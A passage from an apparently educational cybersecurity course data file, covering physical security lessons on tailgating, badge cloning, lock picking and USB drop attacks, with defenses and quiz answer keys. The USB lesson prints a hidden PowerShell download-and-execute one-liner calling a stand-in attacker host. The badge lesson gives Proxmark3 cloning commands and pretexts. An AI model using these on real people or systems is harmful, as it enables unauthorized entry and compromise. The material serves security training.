\`\`\`

**The Delivery:**
\`\`\`
Wear delivery uniform
Carry packages
"Delivery for Jane Smith, third floor"
Most people hold door for delivery
\`\`\`

**The Contractor:**
\`\`\`
Clipboard + hi-vis vest + confidence
"I'm here to check the HVAC"
Walk with purpose
People assume you belong
\`\`\`

**Defense:**

\`\`\`
✓ Badge everyone (no exceptions)
✓ Security awareness training
✓ Mantrap doors (airlock style)
✓ Security guards verify
✓ Report suspicious people
\`\`\``,
              image: null,
              quiz: [
                {
                  id: 'p5r3-q1',
                  question: 'What is tailgating in physical security?',
                  options: ['Following cars', 'Following an authorized person through a secure door', 'A party at the office', 'Checking peoples\' badges'],
                  correctIndex: 1,
                  explanation: 'Tailgating is when an unauthorized person follows closely behind an authorized person through a secure entrance, bypassing access controls.'
                },
                {
                  id: 'p5r3-q1a',
                  question: "Someone carrying boxes asks you to hold the secure door open. What is the best response?",
                  options: [
                    "Politely ask them to badge in, or direct them to reception",
                    "Hold the door, it would be rude not to",
                    "Give them your badge",
                    "Ignore them and run"
                  ],
                  correctIndex: 0,
                  explanation: "Tailgating is following an authorized person through a secure door. Being polite and following the process protects everyone, and real staff will understand."
                },
                {
                  id: 'p5r3-q1b',
                  question: "Why do tailgating attempts so often work?",
                  options: [
                    "Badges never work",
                    "People feel rude refusing to hold a door",
                    "All doors are unlocked",
                    "Cameras are always off"
                  ],
                  correctIndex: 1,
                  explanation: "Attackers use good manners against you, for example by carrying boxes or looking busy. Training and a culture where it is okay to say no close this gap."
                }
              ]
            },
            {
              title: 'Badge Cloning',
              instruction: `Copying access cards to gain unauthorized entry.

**RFID/NFC badges:**

Most offices use:
- RFID (125kHz or 13.56MHz)
- NFC (Near Field Communication)

**Cloning process:**

\`\`\`bash
# Hardware needed:
Proxmark3 (RFID reader/writer)
or
ACR122U (NFC reader) + phone

# Steps:
1. Read original badge
2. Copy UID (unique ID)
3. Write to blank card
4. Test cloned badge
\`\`\`

**Reading a badge:**

\`\`\`bash
# With Proxmark3
proxmark3> lf search
# Detects card type

proxmark3> lf t55xx read
# Reads data
\`\`\`

**Writing to blank:**

\`\`\`bash
proxmark3> lf t55xx write <data>
\`\`\`

**Social engineering for access:**

\`\`\`
"Can I borrow your badge? Mine isn't working"
Bump into person (read badge in pocket)
Find lost badge
Take photo of badge (visible ID number)
\`\`\`

**Defense:**

\`\`\`
✓ Encrypted badges (harder to clone)
✓ Two-factor (badge + PIN)
✓ Report lost badges immediately
✓ Don't show badge in photos
✓ Badge readers that detect clones
\`\`\``,
              image: null,
            },
            {
              title: 'Lock Picking Basics',
              instruction: `Physical locks are just another barrier.

**Common lock types:**

\`\`\`
Pin tumbler (most common)
Wafer locks (cabinets)
Tubular locks (vending machines)
Combination locks
Electronic locks
\`\`\`

**Basic picking tools:**

\`\`\`
Tension wrench (apply pressure)
Pick (manipulate pins)
Rake (quick attack)
\`\`\`

**Simple picking:**

\`\`\`
1. Insert tension wrench
2. Apply slight turning pressure
3. Insert pick
4. Push pins up one at a time
5. When all pins set → lock turns
\`\`\`

**Bypass techniques:**

**Shimming:**
\`\`\`
Padlock bypass
Insert thin metal between shackle and body
Release locking mechanism
\`\`\`

**Bumping:**
\`\`\`
Special "bump key"
Insert and tap
Pins jump to shear line
Lock opens
\`\`\`

**Note on legality:**

\`\`\`
✓ Own locks only
✓ Penetration test with permission
✓ Professional locksmith work

❌ Illegal entry
❌ Tampering with others' locks
❌ Using for crime
\`\`\`

> Lock picking is a skill, not a crime - use legally!`,
              image: null,
              quiz: [
                {
                  id: 'p5r3-q2',
                  question: 'When is lock picking legal?',
                  options: ['Always', 'On locks you own or have explicit permission to pick', 'Never', 'Only at night'],
                  correctIndex: 1,
                  explanation: 'Lock picking is legal when done on your own property or with explicit written permission (like during authorized penetration tests). Unauthorized lock picking is illegal.'
                },
                {
                  id: 'p5r3-q2a',
                  question: "A caller says they are from your bank's fraud team and asks you to read out a one-time code. What do you do?",
                  options: [
                    "Read out the code",
                    "Give them half of the code",
                    "Hang up and call the bank back on the number from your card or official website",
                    "Ask them to call back from another number"
                  ],
                  correctIndex: 2,
                  explanation: "One-time codes should never be shared with anyone. Calling back on a number you trust ensures you reach the real bank."
                },
                {
                  id: 'p5r3-q2b',
                  question: "Why is the caller ID not proof of who is calling?",
                  options: [
                    "It is always correct",
                    "It is protected by HTTPS",
                    "It cannot be seen on mobile phones",
                    "It can be faked, which is called spoofing"
                  ],
                  correctIndex: 3,
                  explanation: "Attackers can make a call appear to come from a trusted number. Always verify through a channel you started yourself."
                }
              ]
            },
            {
              title: 'USB Drop Attacks',
              instruction: `Leaving infected USB drives for people to find.

**How it works:**

\`\`\`
1. Prepare USB with payload
2. Leave in parking lot / elevator / bathroom
3. Curious employee picks it up
4. Plugs into work computer
5. Payload executes
6. Game over
\`\`\`

**Payloads:**

**Rubber Ducky:**
\`\`\`
Looks like USB drive
Acts as keyboard
Types commands faster than human
Runs PowerShell script
Establishes backdoor
\`\`\`

**Example payload:**

\`\`\`bash
# Download and execute
powershell -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"
\`\`\`

**Making it tempting:**

\`\`\`
Label: "Executive Salary 2024 - Confidential"
Label: "Q4 Layoff List - HR"
Label: "Security Audit Report"
Label: "John's Personal - Private Photos"
\`\`\`

**Defense:**

\`\`\`
✓ USB port blocking (policy/physical)
✓ Autorun disabled
✓ Employee awareness
✓ Don't plug unknown devices
✓ Endpoint protection
✓ Application whitelisting
\`\`\`

**Testing:**

\`\`\`
Drop harmless USB that logs when plugged in
No payload, just tracking
Measure success rate
Train those who plugged in
\`\`\``,
              image: null,
            },
            {
              title: 'Physical Security Best Practices',
              instruction: `Comprehensive physical security controls.

**Access control:**

\`\`\`
✓ Badge + PIN (two-factor)
✓ Mantrap entrances
✓ Security guards
✓ Visitor logs
✓ Escort requirements
✓ Automatic lock timeouts
\`\`\`

**Monitoring:**

\`\`\`
✓ CCTV cameras
✓ Motion sensors
✓ Door alarms
✓ Server room monitoring
✓ Log all access
\`\`\`

**Secure areas:**

\`\`\`
Server room:
- Restricted access
- Biometric readers
- Cameras
- Climate control
- Fire suppression

Work areas:
- Clean desk policy
- Lock screens when away
- Visitor badges
- No tailgating signs
\`\`\`

**Employee training:**

\`\`\`
✓ Challenge strangers
✓ Don't hold doors
✓ Report lost badges
✓ Don't share badges
✓ Secure documents
✓ Lock workstations
✓ Don't plug unknown USB
\`\`\`

**Regular testing:**

\`\`\`bash
# Red team exercises
Attempt to gain physical access
Test tailgating success
Drop USB devices
Clone badges
Measure effectiveness
\`\`\`

> Physical security + Digital security = Defense in depth`,
              image: null,
              quiz: [
                {
                  id: 'p5r3-q3',
                  question: 'What is a mantrap entrance?',
                  options: ['A trap for catching intruders', 'An airlock-style double door system that prevents tailgating', 'A manual trap door', 'A security guard station'],
                  correctIndex: 1,
                  explanation: 'A mantrap is a double-door system where the first door must close before the second opens, preventing tailgating and ensuring only one person enters at a time.'
                },
                {
                  id: 'p5r3-q3a',
                  question: "You get an urgent message from the CEO asking you to buy gift cards. What is the best response?",
                  options: [
                    "Verify the request through another channel, such as calling the CEO on a known number",
                    "Buy the cards quickly",
                    "Reply asking for the CEO's password",
                    "Forward it to a colleague and wait"
                  ],
                  correctIndex: 0,
                  explanation: "A clear process of checking unusual requests stops most social engineering attacks. Urgency and authority together are a warning sign."
                },
                {
                  id: 'p5r3-q3b',
                  question: "Which control helps even if an employee is tricked into giving away their password?",
                  options: [
                    "Making the password longer",
                    "Multi-factor authentication (MFA)",
                    "Hiding the login page",
                    "Using a different browser"
                  ],
                  correctIndex: 1,
                  explanation: "With MFA, a stolen password alone is not enough to log in. It does not fix everything, since attackers can try to steal codes too, so training still matters."
                }
              ]
            }
          ],
        }],
    }],
};
